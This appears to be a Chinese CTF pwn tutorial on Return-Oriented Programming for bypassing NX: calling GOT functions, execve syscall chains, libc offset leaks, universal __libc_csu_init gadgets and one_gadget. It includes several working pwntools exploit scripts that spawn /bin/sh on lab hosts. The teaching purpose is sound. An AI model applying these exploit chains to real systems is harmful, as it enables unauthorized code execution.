**作者：[Tangerine@SAINTSEC](https://bbs.ichunqiu.com/thread-42530-1-1.html?from=beef)**

 **原文来自：**[
**https://bbs.ichunqiu.com/thread-42530-1-1.html**](https://bbs.ichunqiu.com/thread-42530-1-1.html?from=beef)

#  0x00 背景

在上一篇教程的《shellcode的变形》一节中，我们提到过内存页的RWX三种属性。显然，如果某一页内存没有可写(W)属性，我们就无法向里面写入代码，如果没有可执行(X)属性，写入到内存页中的shellcode就无法执行。关于这个特性的实验在此不做展开，大家可以尝试在调试时修改EIP和read()/scanf()/gets()等函数的参数来观察操作无对应属性内存的结果。那么我们怎么看某个ELF文件中是否有RWX内存页呢？首先我们可以在静态分析和调试中使用IDA的快捷键Ctrl
+ S  
![image.png](https://image.3001.net/images/20180710/15312028905636.png!small)

![image.png](https://image.3001.net/images/20180710/15312029077978.png!small)

或者同上一篇教程中的方法，使用pwntools自带的checksec命令检查程序是否带有RWX段。当然，由于程序可能在运行中调用mprotect(),
mmap()等函数动态修改或分配具有RWX属性的内存页，以上方法均可能存在误差。

既然攻击者们能想到在RWX段内存页中写入shellcode并执行，防御者们也能想到，因此，一种名为NX位（No eXecute
bit）的技术出现了。这是一种在CPU上实现的安全技术，这个位将内存页以数据和指令两种方式进行了分类。被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性。由于该保护方式的使用，之前直接向内存中写入shellcode执行的方式显然失去了作用。因此，我们就需要学习一种著名的绕过技术——ROP（Return-Oriented Programming, 返回导向编程）

顾名思义，ROP就是使用返回指令ret连接代码的一种技术（同理还可以使用jmp系列指令和call指令，有时候也会对应地成为JOP/COP）。一个程序中必然会存在函数，而有函数就会有ret指令。我们知道，ret指令的本质是pop
eip，即把当前栈顶的内容作为内存地址进行跳转。而ROP就是利用栈溢出在栈上布置一系列内存地址，每个内存地址对应一个gadget，即以ret/jmp/call等指令结尾的一小段汇编指令，通过一个接一个的跳转执行某个功能。由于这些汇编指令本来就存在于指令区，肯定可以执行，而我们在栈上写入的只是内存地址，属于数据，所以这种方式可以有效绕过NX保护。

  
0x01 使用ROP调用got表中函数  

首先我们来看一个x86下的简单ROP，我们将通过这里例子演示如何调用一个存在于got表中的函数并控制其参数。我们打开~/RedHat
2017-pwn1/pwn1。可以很明显看到main函数存在栈溢出：

![image.png](https://image.3001.net/images/20180710/15312029285099.png!small)变量v1的首地址在bp-28h处，即变量在栈上，而输入使用的`__isoc99_scanf`不限制长度，因此我们的过长输入将会造成栈溢出。

![image.png](https://image.3001.net/images/20180710/15312029385911.png!small)

程序开启了NX保护，所以显然我们不可能用shellcode打开一个shell。根据之前文章的思路，我们很容易想到要调用system函数执行`system(“/bin/sh”)`。那么我们从哪里可以找到`system`和`”/bin/sh”`呢？

第一个问题，我们知道使用动态链接的程序导入库函数的话，我们可以在GOT表和PLT表中找到函数对应的项（稍后的文章中我们将详细解释）。跳转到.got.plt段，我们发现程序里居然导入了system函数。

![image.png](https://image.3001.net/images/20180710/15312029614074.png!small)  

解决了第一个问题之后我们就需要考虑第二个问题。通过对程序的搜索我们没有发现字符串`“/bin/sh”`，但是程序里有`__isoc99_scanf`，我们可以调用这个函数来读取`”/bin/sh”`字符串到进程内存中。下面我们来开始构建ROP链。

首先我们考虑一下`“/bin/sh”`字符串应该放哪。通过调试时按Ctrl+S快捷键查看程序的内存分段，我们看到`0x0804a030`开始有个可读可写的大于8字节的地址，且该地址不受ASLR影响，我们可以考虑把字符串读到这里。![image.png](https://image.3001.net/images/20180710/15312029708697.png!small)接下来我们找到`__isoc99_scanf`的另一个参数`“%s”`，位于`0x08048629`

`![image.png](https://image.3001.net/images/20180710/15312029796485.png!small)  
`

接着我们使用pwntools的功能获取到`__isoc99_scanf`在PLT表中的地址，PLT表中有一段stub代码，将EIP劫持到某个函数的PLT表项中我们可以直接调用该函数。我们知道，对于x86的应用程序来说，其参数从右往左入栈。因此，现在我们就可以构建出一个ROP链。  
`from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)  
io = remote('172.17.0.3', 10001)

elf = ELF('./pwn1')  
scanf_addr = p32(elf.symbols['__isoc99_scanf'])  
format_s = p32(0x08048629)  
binsh_addr = p32(0x0804a030)

shellcode1 = 'A'*0x34  
shellcode1 += scanf_addr  
shellcode1 += format_s  
shellcode1 += binsh_addr

print io.read()  
io.sendline(shellcode1)  
io.sendline(“/bin/sh”)` 我们来测试一下。
通过调试我们可以看到，当EIP指向retn时，栈上的数据和我们的预想一样，栈顶是plt表中`__isoc99_scanf`的首地址，紧接着是两个参数。
![](data/attachment/album/201807/06/113538drglfgfgrrlmrtry.png)
我们继续跟进执行，在libc中执行一会儿之后，我们收到了一个错误
![](data/attachment/album/201807/06/113544p5333t7qe797qgbt.png)
这是为什么呢？我们回顾一下之前的内容。我们知道call指令会将call指令的下一条指令地址压入栈中，当被call调用的函数运行结束后，ret指令就会取出被call指令压入栈中的地址传输给EIP。但是在这里我们绕过call直接调用了`__isoc99_scanf`，没有像call指令一样向栈压入一个地址。此时函数认为返回地址是紧接着`scanf_addr`的`format_s`，而第一个参数就变成了`binsh_addr`  
call调用函数的情况

    
    
    08048557  mov   [esp+4], eax
    0804855B  mov   dword ptr [esp], offset unk_8048629                
    08048562  call    ___isoc99_scanf                
    08048567  lea     eax, [esp+18h]

![image.png](https://image.3001.net/images/20180710/15312030156969.png!small)![image.png](https://image.3001.net/images/20180710/15312030845936.png!small)![image.png](https://image.3001.net/images/20180710/15312030908505.png!small)从两种调用方式的比较上我们可以看到，由于少了call指令的压栈操作，如果我们在布置栈的时候不模拟出一个压入栈中的地址，被调用函数的取到的参数就是错位的。所以我们需要改良一下ROP链。根据上面的描述，我们应该在参数和保存的EIP中间放置一个执行完的返回地址。鉴于我们调用scanf读取字符串后还要调用system函数，我们让`__isoc99_scanf`执行完后再次返回到main函数开头，以便于再执行一次栈溢出。改良后的ROP链如下：![image.png](https://image.3001.net/images/20180710/15312031022453.png!small)我们再次进行调试，发现这回成功调用`__isoc99_scanf`把`”/bin/sh”`字符串读取到地址`0x0804a030`处![image.png](https://image.3001.net/images/20180710/15312031129175.png!small)  

此时程序再次从main函数开始执行。由于栈的状态发生了改变，我们需要重新计算溢出的字节数。然后再次利用ROP链调用`system`执行`system(“/bin/sh”)`，这个ROP链可以模仿上一个写出来，完整的脚本也可以在对应文件夹中找到，此处不再赘述。

接下来让我们来看看64位下如何使用ROP调用got表中的函数。我们打开文件`~/bugs bunny ctf
2017-pwn150/pwn150`，很容易就可以发现溢出出现在Hello()里![image.png](https://image.3001.net/images/20180710/15312031216289.png!small)和上一个例子一样，由于程序开启了NX保护，我们必须找到system函数和`”/bin/sh”`字符串。程序在main函数中调用了自己定义的一个叫today的函数，执行了`system(“/bin/date”)`，那么system函数就有了。至于`”/bin/sh”`字符串，虽然程序中没有，但是我们找到了”sh”字符串，利用这个字符串其实也可以开shell![image.png](https://image.3001.net/images/20180710/15312031317596.png!small)

OK，现在我们有了栈溢出点，有了system函数，有了字符串”sh”，可以尝试开shell了。首先我们要解决传参数的问题。和x86不同，在x64下通常参数从左到右依次放在rdi,
rsi, rdx, rcx, r8,
r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop
rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。

有很多工具可以帮我们找到ROP
gadget，例如pwntools自带的ROP类，ROPgadget、rp++、ropeme等。在这里我使用的是ROPgadget（<https://github.com/JonathanSalwan/ROPgadget>）

通过ROPgadget --binary
指定二进制文件，使用grep在输出的所有gadgets中寻找需要的片段![image.png](https://image.3001.net/images/20180710/15312031394932.png!small)这里有一个小trick。首先，我们看一下IDA中这个地址的内容是什么。![image.png](https://image.3001.net/images/20180710/15312031486267.png!small)我们可以发现并没有`0x400883`这个地址，`0x400882`是`pop
r15`, 接下来就是`0x400884`的`retn`，那么这个`pop
rdi`会不会是因为`ROPgadget`出bug了呢？别急，我们选择`0x400882`，按快捷键D转换成数据。![image.png](https://image.3001.net/images/20180710/15312031572196.png!small)然后选择0x400883按C转换成代码![image.png](https://image.3001.net/images/20180710/15312031671094.png!small)

我们可以看出来pop rdi实际上是pop
r15的“一部分”。这也再次验证了汇编指令不过是一串可被解析为合法opcode的数据的别名。只要对应的数据所在内存可执行，能被转成合法的opcode，跳转过去都是不会有问题的。

现在我们已经准备好了所有东西，可以开始构建ROP链了。这回我们直接调用call
system指令，省去了手动往栈上补返回地址的环节，脚本如下：![image.png](https://image.3001.net/images/20180710/15312031802309.png!small)进行调试，发现开shell成功。![image.png](https://image.3001.net/images/20180710/15312031881637.png!small)retn跳转到0x400883处的`gadget：pop
rdi;
ret`![image.png](https://image.3001.net/images/20180710/15312031955072.png!small)pop
rdi将”sh”字符串所在地址0x4003ef赋值给rdi![image.png](https://image.3001.net/images/20180710/15312032089471.png!small)

retn跳转到call system处

0x02 使用ROP调用int 80h/syscall  
在上一节中，我们接触到了一种最简单的使用ROP的场景。但是现实的情况是很多情况下目标程序并不会导入system函数。在这种情况下我们就需要通过其他方法达到目标。在这一节中我们首先学习的是通过ROP调用`int
80h/syscall`  
关于`int 80h/syscall`，在上一篇文章的《系统调用》一节中已经做了介绍，现在我们来看例子`~/Tamu CTF
2018-pwn5/pwn5`.这个程序的主要功能在`print_beginning()`实现。![image.png](https://image.3001.net/images/20180710/15312032211202.png!small)这个函数有大量的puts()和printf()输出提示，要求我们输入first_name,
last_name和major三个字符串到三个全局变量里，然后选择是否加入Corps of
Cadets。不管选是还是否都会进入一个差不多的函数![image.png](https://image.3001.net/images/20180710/15312032309504.png!small)我们可以看到只有选择选项2才会调用函数change_major()，其他选项都只是打印出一些内容。进入`change_major()`后，我们发现了一个栈溢出：![image.png](https://image.3001.net/images/20180710/15312032397260.png!small)发现了溢出点后，我们就可以开始构思怎么getshell了。就像开头说的那样，这个程序里找不到system函数。但是我们用ROPGadget
--binary pwn5 | grep “int
0x80”找到了一个可用的`gadget`![image.png](https://image.3001.net/images/20180710/15312032556886.png!small)回顾一下上一篇文章，我们知道在<http://syscalls.kernelgrok.com/>
上可以找到sys_execve调用，同样可以用来开shell，这个系统调用需要设置5个寄存器，其中`eax = 11 = 0xb, ebx =
&(“/bin/sh”), ecx = edx = edi = 0.
“/bin/sh”`我们可以在前面输入到地址固定的全局变量中。接下来我们就要通过ROPgadget搜索`pop eax/ebx/ecx/edx/esi;
ret`了。![image.png](https://image.3001.net/images/20180710/15312032648784.png!small)pop
eax; pop ebx; pop esi; pop edi;
ret![image.png](https://image.3001.net/images/20180710/15312032828524.png!small)pop
edx; pop ecx; pop ebx;
ret![image.png](https://image.3001.net/images/20180710/1531203290120.png!small)构建ROP链和脚本如下：![image.png](https://image.3001.net/images/20180710/15312033182164.png!small)调试时发现执行失败了，ROP链并没有被读进去![image.png](https://image.3001.net/images/20180710/15312033266757.png!small)![image.png](https://image.3001.net/images/20180710/15312033306546.png!small)

这是为什么呢？

我们输出payload后发现0x080150a里面有两个0x0a，即“\n”![image.png](https://image.3001.net/images/20180710/15312033396606.png!small)在输入的时候，我们会使用回车键”\n”代表输入结束，显然这边也是受到了这个控制字符的影响，因此我们需要重新挑选gadgets。我们把gadget换成这一条![image.png](https://image.3001.net/images/20180710/15312033462482.png!small)修改脚本发现成功getshell

# 0x03 从给定的libc中寻找gadget

  
有时候pwn题目也会提供一个pwn环境里对应版本的libc。在这种情况下，我们就可以通过泄露出某个在libc中的内容在内存中的实际地址，通过计算偏移来获取system和“/bin/sh”的地址并调用。这一节的例子是`~/Security
Fest CTF 2016-tvstation/tvstation`.
这是一个比较简单的题目，题目中除了显示出来的三个选项之外还有一个隐藏的选项4，选项4会直接打印出system函数在内存中的首地址：![image.png](https://image.3001.net/images/20180710/15312033715048.png!small)![image.png](https://image.3001.net/images/20180710/15312033757844.png!small)从IDA中我们可以看到打印完地址后执行了函数debug_func()，进入函数debug_func()之后我们发现了溢出点![image.png](https://image.3001.net/images/20180710/15312033858952.png!small)由于这个题目给了libc，且我们已经泄露出了system的内存地址。使用命令readelf
-a
查看libc.so.6_x64![image.png](https://image.3001.net/images/20180710/1531203397309.png!small)

从这张图上我们可以看出来.text节（Section）属于第一个LOAD段（Segment），这个段的文件长度和内存长度是一样的，也就是说所有的代码都是原样映射到内存中，代码之间的相对偏移是不会改变的。由于前面的PHDR,
INTERP两个段也是原样映射，所以在IDA里看到的system首地址距离文件头的地址偏移和运行时的偏移是一样的。如：

在这个libc中system函数首地址是0x456a0，即从文件的开头数0x456a0个字节到达system函数![image.png](https://image.3001.net/images/20180710/15312034079337.png!small)

![image.png](https://image.3001.net/images/20180710/15312034241382.png!small)![image.png](https://image.3001.net/images/20180710/1531203428306.png!small)调试程序，发现system在内存中的地址是0x7fb5c8c266a0![image.png](https://image.3001.net/images/20180710/15312034413226.png!small)0x7fb5c8c266a0
-0x456a0
=0x7fb5c8be1000‬![image.png](https://image.3001.net/images/20180710/15312034481270.png!small)

根据这个事实，我们就可以通过泄露出来的libc中的函数地址获取libc在内存中加载的首地址，从而以此跳转到其他函数的首地址并执行。

在libc中存在字符串`”/bin/sh”`，该字符串位于.data节，根据同样的原理我们也可以得知这个字符串距libc首地址的偏移

![image.png](https://image.3001.net/images/20180710/15312034631003.png!small)还有用来传参的`gadget
:pop rdi;
ret`![image.png](https://image.3001.net/images/20180710/1531203471823.png!small)据此我们可以构建脚本如下  

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    
    io = remote('172.17.0.2', 10001)
    
    io.recvuntil(": ")
    io.sendline('4')                                        #跳转到隐藏选项
    io.recvuntil("@0x")
    system_addr = int(io.recv(12), 16)        #读取输出的system函数在内存中的地址
    libc_start = system_addr - 0x456a0        #根据偏移计算libc在内存中的首地址
    pop_rdi_addr = libc_start + 0x1fd7a        #pop rdi; ret 在内存中的地址，给system函数传参
    binsh_addr = libc_start + 0x18ac40        #"/bin/sh"字符串在内存中的地址
    
    payload = ""
    payload += 'A'*40                                        #padding
    payload += p64(pop_rdi_addr)                #pop rdi; ret
    payload += p64(binsh_addr)                        #system函数参数
    payload += p64(system_addr)                        #调用system()执行system("/bin/sh")
    
    io.sendline(payload)
    
    io.interactive()

# 0x04 一些特殊的gadgets

这一节主要介绍两个特殊的gadgets。第一个gadget经常被称作通用gadgets，通常位于x64的ELF程序中的`__libc_csu_init`中，如下图所示：![image.png](https://image.3001.net/images/20180710/15312035041055.png!small)这张图片里包含了两个gadget，分别是![image.png](https://image.3001.net/images/20180710/15312035172795.png!small)

我们知道在x64的ELF程序中向函数传参，通常顺序是`rdi, rsi, rdx, rcx, r8, r9`,
栈，以上三段gadgets中，第一段可以设置`r12-r15`，接上第三段使用已经设置的寄存器设置rdi, 接上第二段设置rsi, rdx,
rbx，最后利用`r12+rbx*8`可以call任意一个地址。在找gadgets出现困难时，可以利用这个gadgets快速构造ROP链。需要注意的是，用万能gadgets的时候需要设置`rbp=1`，因为`call
qword ptr [r12+rbx*8]`之后是`add rbx, 1; cmp rbx, rbp; jnz
xxxxxx`。由于我们通常使rbx=0，从而使`r12+rbx*8 = r12`，所以call指令结束后rbx必然会变成1。若此时`rbp !=
1`，jnz会再次进行call，从而可能引起段错误。那么这段gadgets怎么用呢？我们来看一下例子`~/LCTF 2016-pwn100/pwn100`

这个例子提供了libc，溢出点很明显，位于0x40063d![image.png](https://image.3001.net/images/20180710/15312035266928.png!small)我们需要做的就是泄露一个got表中函数的地址，然后计算偏移调用system。前面的代码很简单，我们就不做介绍了

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    
    io = remote("172.17.0.3", 10001)
    elf = ELF("./pwn100")
    
    puts_addr = elf.plt['puts']
    read_got = elf.got['read']
    
    start_addr = 0x400550
    pop_rdi = 0x400763
    universal_gadget1 = 0x40075a           #万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
    universal_gadget2 = 0x400740        #万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
    binsh_addr = 0x60107c                        #bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃
    
    payload = "A"*72                                #padding
    payload += p64(pop_rdi)                        #
    payload += p64(read_got)
    payload += p64(puts_addr)
    payload += p64(start_addr)                #跳转到start，恢复栈
    payload = payload.ljust(200, "B")        #padding
    
    io.send(payload)
    io.recvuntil('bye~\n')
    read_addr = u64(io.recv()[:-1].ljust(8, '\x00'))
    log.info("read_addr = %#x", read_addr)
    system_addr = read_addr - 0xb31e0
    log.info("system_addr = %#x", system_addr)

为了演示万能gadgets的使用，我们选择再次通过调用read函数读取/bin/sh\x00字符串，而不是直接使用偏移。首先我们根据万能gadgets布置好栈

    
    
    payload = "A"*72                        #padding
    payload += p64(universal_gadget1)        #万能gadget1
    payload += p64(0)                        #rbx = 0
    payload += p64(1)                        #rbp = 1，过掉后面万能gadget2的call返回后的判断
    payload += p64(read_got)        #r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用
    payload += p64(8)                        #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx
    payload += p64(binsh_addr)        #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi
    payload += p64(0)                        #r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi
    payload += p64(universal_gadget2)        #万能gadget2

  
我们是不是应该直接在payload后面接上返回地址呢？不，我们回头看一下universal_gadget2的执行流程  

![115534eky7jd464kj1j734.png](https://bbs.ichunqiu.com/data/attachment/album/201807/06/115534eky7jd464kj1j734.png)由于我们的构造，上面的那块代码只会执行一次，然后流程就将跳转到下面的`loc_400756`，这一系列操作将会抬升`8*7`共56字节的栈空间，因此我们还需要提供56个字节的垃圾数据进行填充，然后再拼接上retn要跳转的地址。

    
    
    payload += '\x00'*56                #万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
    payload += p64(start_addr)        #跳转到start，恢复栈
    payload = payload.ljust(200, "B")        #padding
    接下来就是常规操作getshell
    io.send(payload)
    io.recvuntil('bye~\n')
    io.send("/bin/sh\x00")                #上面的一段payload调用了read函数读取"/bin/sh\x00"，这里发送字符串
    
    payload = "A"*72                                #padding
    payload += p64(pop_rdi)                        #给system函数传参
    payload += p64(binsh_addr)                #rdi = &("/bin/sh\x00")
    payload += p64(system_addr)                #调用system函数执行system("/bin/sh")
    payload = payload.ljust(200, "B")        #padding
    
    io.send(payload)
    io.interactive()

我们介绍的第二个gadget通常被称为one gadget
RCE，顾名思义，通过一个gadget远程执行代码，即getshell。我们通过例子~/TJCTF
2016-oneshot/oneshot演示一下这个gadget的威力。  
要利用这个gadget，我们需要一个对应环境的libc和一个工具one_gadget([https://github.com/david942j/one_gadget)。这个程序没有栈溢出，其代码非常简单](https://github.com/david942j/one_gadget\)%E3%80%82%E8%BF%99%E4%B8%AA%E7%A8%8B%E5%BA%8F%E6%B2%A1%E6%9C%89%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E5%85%B6%E4%BB%A3%E7%A0%81%E9%9D%9E%E5%B8%B8%E7%AE%80%E5%8D%95)  

![115611fcgly38gz3tzwj3i.png](https://bbs.ichunqiu.com/data/attachment/album/201807/06/115611fcgly38gz3tzwj3i.png)从红框中的代码我们看到地址rbp+var_8被作为`__isoc99_scanf`的第二个参数赋值给rsi，即输入被保存在这里。随后rbp+var_8中的内容被赋值给rax，又被赋值给rdx，最后通过`call
rdx`执行。也就是说我们输入一个数字，这个数字会被当成地址使用call调用。由于只能控制4字节，我们就需要用到one gadget
RCE来一步getshell。我们通过one_gadget找到一些gadget：![115632ntojbsebojalwwzz.png](https://bbs.ichunqiu.com/data/attachment/album/201807/06/115632ntojbsebojalwwzz.png)我们看到这些gadget有约束条件。我们选择第一条，要求rax=0。我们构建脚本进行调试：

    
    
    #!/usr/bin/python
    #coding:utf-8
    
    from pwn import *
    
    one_gadget_rce = 0x45526
    #one_gadget libc.so.6_x64
    #0x45526        execve("/bin/sh", rsp+0x30, environ)
    #constraints:
    #  rax == NULL
    setbuf_addr = 0x77f50        
    setbuf_got = 0x600ae0
    
    io = remote("172.17.0.2", 10001)
    
    io.sendline(str(setbuf_got))
    io.recvuntil("Value: ")
    setbuf_memory_addr = int(io.recv()[:18], 16)        #通过打印got表中setbuf项的内容泄露setbuf在内存中的首地址
    
    io.sendline(str(setbuf_memory_addr - (setbuf_addr - one_gadget_rce)))        #通过偏移计算one_gadget_rce在内存中的地址
    
    io.interactive()

  
执行到call rdx时rax = 0

![115652pf9q5395hw8qhwnd.png](https://bbs.ichunqiu.com/data/attachment/album/201807/06/115652pf9q5395hw8qhwnd.png)getshell成功![115657oscpeqxxehcrexzk.png](https://bbs.ichunqiu.com/data/attachment/album/201807/06/115657oscpeqxxehcrexzk.png)

#
**大家可以[阅读原文](https://bbs.ichunqiu.com/thread-42285-1-1.html?from=beef)下载课后例题和练习题哦~**

  

